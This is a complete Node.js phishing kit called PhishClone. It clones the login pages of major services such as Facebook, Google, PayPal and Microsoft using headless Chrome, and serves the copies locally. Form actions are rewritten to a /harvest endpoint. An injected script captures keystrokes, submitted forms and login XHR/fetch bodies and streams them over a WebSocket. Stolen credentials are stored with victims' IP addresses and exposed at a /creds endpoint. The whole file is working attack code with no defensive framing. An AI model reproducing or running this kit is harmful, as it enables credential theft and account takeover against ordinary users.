#!/usr/bin/env node
/**
 * phantom-arsenal / PhishClone v5.0
 * - Auto-detects Chrome path
 * - zphisher-style menu: pick a site or enter custom URL
 * - Headless Chrome for SPA rendering
 * - Live keystrokes via raw WebSocket
 * - XHR + fetch interception
 */

import puppeteer   from 'puppeteer'
import http        from 'http'
import https       from 'https'
import net         from 'net'
import fs          from 'fs'
import crypto      from 'crypto'
import readline    from 'readline'
import { createServer } from 'http'
import { createHash }   from 'crypto'
import { execSync }     from 'child_process'

// ── auto-detect Chrome ───────────────────────────────────────────────────────
function findChrome() {
  const candidates = [
    '/usr/bin/chromium',
    '/usr/bin/chromium-browser',
    '/usr/bin/google-chrome',
    '/usr/bin/google-chrome-stable',
  ]
  // check puppeteer cache
  try {
    const base = '/root/.cache/puppeteer/chrome'
    const dirs = fs.readdirSync(base)
    for (const d of dirs) {
      const p = base + '/' + d + '/chrome-linux64/chrome'
      if (fs.existsSync(p)) return p
    }
  } catch {}
  for (const c of candidates) if (fs.existsSync(c)) return c
  return null
}

const CHROME = findChrome()
if (!CHROME) {
  console.error('❌ Chrome not found. Run: npx puppeteer browsers install chrome')
  process.exit(1)
}

// ── utils ────────────────────────────────────────────────────────────────────
const CREDS_FILE = 'captured_creds.json'
const LOG_FILE   = 'keystrokes.log'
const ASSET_MAP  = new Map()

function findFreePort(start) {
  return new Promise(res => {
    const s = net.createServer()
    s.listen(start, () => { const p = s.address().port; s.close(() => res(p)) })
    s.on('error', () => findFreePort(start + 1).then(res))
  })
}

function urlKey(u) { return createHash('md5').update(u).digest('hex').slice(0,12) }

function fetchBin(u, timeout=8000) {
  return new Promise((resolve, reject) => {
    const mod = u.startsWith('https') ? https : http
    const req = mod.get(u, { timeout, headers: { 'User-Agent': 'Mozilla/5.0 Chrome/124.0' }}, res => {
      if ([301,302,303,307,308].includes(res.statusCode) && res.headers.location) {
        const loc = res.headers.location.startsWith('http') ? res.headers.location
          : new URL(res.headers.location, u).href
        return fetchBin(loc, timeout).then(resolve).catch(reject)
      }
      const c = []; res.on('data', d => c.push(d)); res.on('end', () => resolve({ data: Buffer.concat(c), ct: res.headers['content-type']||'' }))
    })
    req.on('error', reject)
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')) })
  })
}

function log(msg) { fs.appendFileSync(LOG_FILE, msg+'\n') }

function saveCred(ip, data, target) {
  let arr=[]; try{ arr=JSON.parse(fs.readFileSync(CREDS_FILE,'utf8')) }catch{}
  arr.push({ time: new Date().toISOString(), ip, target, credentials: data })
  fs.writeFileSync(CREDS_FILE, JSON.stringify(arr,null,2))
  console.log('\n\x1b[41m\x1b[97m [CAPTURED] IP='+ip+' -> '+JSON.stringify(data)+' \x1b[0m\n')
}

// ── menu ─────────────────────────────────────────────────────────────────────
const SITES = [
  { name: 'Facebook',       url: 'https://www.facebook.com/login' },
  { name: 'Instagram',      url: 'https://www.instagram.com/accounts/login/' },
  { name: 'Google',         url: 'https://accounts.google.com/signin' },
  { name: 'Twitter / X',    url: 'https://twitter.com/i/flow/login' },
  { name: 'LinkedIn',       url: 'https://www.linkedin.com/login' },
  { name: 'Snapchat',       url: 'https://accounts.snapchat.com/accounts/login' },
  { name: 'TikTok',         url: 'https://www.tiktok.com/login' },
  { name: 'GitHub',         url: 'https://github.com/login' },
  { name: 'Microsoft',      url: 'https://login.microsoftonline.com/' },
  { name: 'PayPal',         url: 'https://www.paypal.com/signin' },
  { name: 'Netflix',        url: 'https://www.netflix.com/login' },
  { name: 'Steam',          url: 'https://store.steampowered.com/login/' },
  { name: 'Discord',        url: 'https://discord.com/login' },
  { name: 'Spotify',        url: 'https://accounts.spotify.com/login' },
  { name: 'Custom URL',     url: null },
]

async function askTarget() {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
  const ask = q => new Promise(r => rl.question(q, r))

  console.clear()
  console.log('\x1b[96m')
  console.log('╔══════════════════════════════════════════════════╗')
  console.log('║      phantom-arsenal — PhishClone v5.0          ║')
  console.log('║   zphisher-style • SPA • Auto-clone any site    ║')
  console.log('╚══════════════════════════════════════════════════╝')
  console.log('\x1b[0m')
  console.log('\x1b[93m  Select target:\x1b[0m\n')
  SITES.forEach((s,i) => {
    const n = String(i+1).padStart(2,' ')
    console.log('  \x1b[96m['+n+']\x1b[0m  ' + s.name)
  })
  console.log('')

  let target = null
  while (!target) {
    const choice = await ask('\x1b[92m  Enter number: \x1b[0m')
    const idx = parseInt(choice) - 1
    if (idx >= 0 && idx < SITES.length) {
      if (SITES[idx].url === null) {
        target = await ask('\x1b[92m  Enter URL: \x1b[0m')
        target = target.trim()
      } else {
        target = SITES[idx].url
      }
    } else {
      console.log('  \x1b[91mInvalid choice\x1b[0m')
    }
  }
  rl.close()
  return target
}

// ── clone with headless Chrome ───────────────────────────────────────────────
async function clonePage(targetUrl, wsPort) {
  console.log('\n[*] Launching headless Chrome...')
  const browser = await puppeteer.launch({
    headless: true,
    executablePath: CHROME,
    args: ['--no-sandbox','--disable-setuid-sandbox','--disable-dev-shm-usage','--disable-gpu']
  })
  const page = await browser.newPage()
  await page.setViewport({ width: 1280, height: 800 })
  await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36')

  const assetUrls = new Set()
  await page.setRequestInterception(true)
  page.on('request', req => {
    if (['stylesheet','script','image','font','media'].includes(req.resourceType())) assetUrls.add(req.url())
    req.continue()
  })

  await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 })
  await new Promise(r => setTimeout(r, 2000))

  const finalUrl = page.url()
  let html = await page.content()
  await browser.close()

  console.log('[+] Rendered: ' + html.length + ' bytes | Assets: ' + assetUrls.size)
  console.log('[*] Downloading assets...')

  const results = (await Promise.all([...assetUrls].map(async u => {
    try {
      const { data, ct } = await fetchBin(u)
      const key = urlKey(u)
      ASSET_MAP.set(key, { data, ct })
      return [u, key]
    } catch { return null }
  }))).filter(Boolean)

  console.log('[+] Cached ' + results.length + '/' + assetUrls.size + ' assets')

  for (const [orig, key] of results)
    html = html.split(orig).join('/asset/' + key)

  // intercept forms
  html = html.replace(/(<form[^>]*)\s+action="[^"]*"/gi, '$1 action="/harvest"')
  html = html.replace(/(<form[^>]*)\s+action='[^']*'/gi, "$1 action='/harvest'")
  html = html.replace(/(<form)(?![^>]*action=)([^>]*>)/gi, '$1 action="/harvest"$2')

  const redirectUrl = finalUrl.replace(/'/g, "\\'")
  const injected = `
<script>
(function(){
  var ws; function cws(){ try{ ws=new WebSocket('ws://'+location.hostname+':${wsPort}'); ws.onclose=function(){setTimeout(cws,2000)}; }catch(e){} } cws();
  function send(t,d){ if(ws&&ws.readyState===1) ws.send(JSON.stringify({type:t,data:d,ts:new Date().toISOString()})); }
  document.addEventListener('keyup',function(e){ var t=e.target; send('keystroke',{key:e.key,field:t.name||t.id||t.placeholder||t.type||'?',value:t.value}); },true);
  document.addEventListener('submit',function(e){
    e.preventDefault(); var f=e.target; var d={};
    new FormData(f).forEach(function(v,k){d[k]=v;});
    send('submit',d);
    fetch('/harvest',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).then(function(){window.location='${redirectUrl}';});
  },true);
  document.addEventListener('click',function(e){
    var el=e.target;
    if(el&&(el.type==='submit'||el.tagName==='BUTTON')){
      var inp=document.querySelectorAll('input'); var d={};
      inp.forEach(function(i){if(i.value)d[i.name||i.id||i.type]=i.value;});
      if(Object.keys(d).length) send('click_harvest',d);
    }
  },true);
  var oX=XMLHttpRequest.prototype.open, oS=XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open=function(m,u){this._u=u;return oX.apply(this,arguments);};
  XMLHttpRequest.prototype.send=function(b){ if(b&&this._u&&/login|auth|session/i.test(this._u)) try{send('xhr',{url:this._u,body:String(b)});}catch(e){} return oS.apply(this,arguments); };
  var oF=window.fetch; window.fetch=function(input,init){
    var u=typeof input==='string'?input:(input.url||'');
    if(/login|auth|session/i.test(u)){ var b=(init&&init.body)||''; try{send('fetch_login',{url:u,body:String(b)});}catch(e){} }
    return oF.apply(this,arguments);
  };
})();
</script></body>`

  if (/<\/body>/i.test(html)) html = html.replace(/<\/body>/i, injected)
  else html += injected

  return { html, finalUrl }
}

// ── WebSocket server (raw TCP, no deps) ──────────────────────────────────────
function startWS(port) {
  const srv = net.createServer(sock => {
    let shook = false
    let buf = Buffer.alloc(0)
    sock.on('data', chunk => {
      buf = Buffer.concat([buf, chunk])
      if (!shook) {
        const str = buf.toString()
        const m = str.match(/Sec-WebSocket-Key: (.+)/)
        if (!m) return
        const accept = createHash('sha1').update(m[1].trim()+'258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64')
        sock.write('HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: '+accept+'\r\n\r\n')
        shook = true; buf = Buffer.alloc(0); return
      }
      // parse frame
      if (buf.length < 2) return
      const masked = (buf[1]&0x80)!==0
      let len = buf[1]&0x7F, off = 2
      if (len===126){ len=buf.readUInt16BE(2); off=4 }
      if (buf.length < off + (masked?4:0) + len) return
      let payload
      if (masked){ const masks=buf.slice(off,off+4); off+=4; payload=Buffer.from(buf.slice(off,off+len)); for(let i=0;i<payload.length;i++) payload[i]^=masks[i%4]; }
      else payload=buf.slice(off,off+len)
      buf = buf.slice(off+len)
      try {
        const d = JSON.parse(payload.toString())
        const t = d.type||''
        if (t==='keystroke'){
          const line='[KEY] field='+(d.data.field||'?')+'  key='+(d.data.key||'?')+'  val='+(d.data.value||'')
          console.log('\x1b[93m'+line+'\x1b[0m'); log(line)
        } else if (['submit','click_harvest','xhr','fetch_login'].includes(t)){
          const line='['+t.toUpperCase()+'] '+JSON.stringify(d.data)
          console.log('\x1b[92m'+line+'\x1b[0m'); log(line)
        }
      } catch {}
    })
    sock.on('error',()=>{})
  })
  srv.listen(port)
}

// ── main ─────────────────────────────────────────────────────────────────────
const targetUrl = process.argv[2] || await askTarget()
const PORT    = await findFreePort(parseInt(process.argv[3]||'8080'))
const WS_PORT = await findFreePort(PORT+1)

const { html, finalUrl } = await clonePage(targetUrl, WS_PORT)
startWS(WS_PORT)

createServer((req, res) => {
  const path = new URL(req.url, 'http://x').pathname

  if (path === '/') {
    const b = Buffer.from(html,'utf8')
    res.writeHead(200,{'Content-Type':'text/html;charset=utf-8','Content-Length':b.length}); res.end(b)

  } else if (path.startsWith('/asset/')) {
    const item = ASSET_MAP.get(path.slice(7))
    if (item) { res.writeHead(200,{'Content-Type':item.ct||'application/octet-stream','Cache-Control':'max-age=86400'}); res.end(item.data) }
    else { res.writeHead(404); res.end() }

  } else if (path === '/creds') {
    let b='[]'; try{ b=fs.readFileSync(CREDS_FILE,'utf8') }catch{}
    res.writeHead(200,{'Content-Type':'application/json'}); res.end(b)

  } else if (path==='/harvest' && req.method==='POST') {
    let body=''
    req.on('data',c=>body+=c)
    req.on('end',()=>{
      let data; try{ data=JSON.parse(body) }catch{ data=Object.fromEntries(new URLSearchParams(body)) }
      saveCred(req.socket.remoteAddress||'?', data, finalUrl)
      res.writeHead(200,{'Content-Type':'application/json'}); res.end('{"ok":true}')
    })
  } else { res.writeHead(404); res.end() }

}).listen(PORT, () => {
  console.log('\n[+] WebSocket  : ws://0.0.0.0:' + WS_PORT)
  console.log('[+] Phishing   : \x1b[92mhttp://0.0.0.0:' + PORT + '\x1b[0m')
  console.log('[+] View Creds : http://0.0.0.0:' + PORT + '/creds')
  console.log('\x1b[93m[*] Ready — waiting for victims...\x1b[0m\n')
})

process.on('SIGINT', () => {
  console.log('\n\x1b[91m[!] Stopped\x1b[0m')
  try {
    const c = JSON.parse(fs.readFileSync(CREDS_FILE,'utf8'))
    console.log('[+] Total captured: ' + c.length)
    c.forEach(x => console.log('  > '+x.time+' | IP='+x.ip+' | '+JSON.stringify(x.credentials)))
  } catch {}
  process.exit(0)
})
